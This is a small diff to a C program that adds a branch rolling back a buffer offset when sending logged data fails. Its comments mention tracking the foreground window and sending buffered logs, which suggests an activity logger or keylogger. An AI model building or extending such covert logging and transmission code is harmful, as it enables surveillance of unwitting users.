@@ -635,6 +635,13 @@ int main()
                         get the current foreground window and store it in the CURRENTPROCESS.
                     */
                 }
+                else
+                {
+                    /*
+                        it did not send successfully, remove the null terminateing character
+                    */
+                    current_process_data.current_buff_offset--;
+                }
                 /*
                     log as much data as possible, but set a limit, if the
                     data has not been sent by the MemConsumeLim then it won't
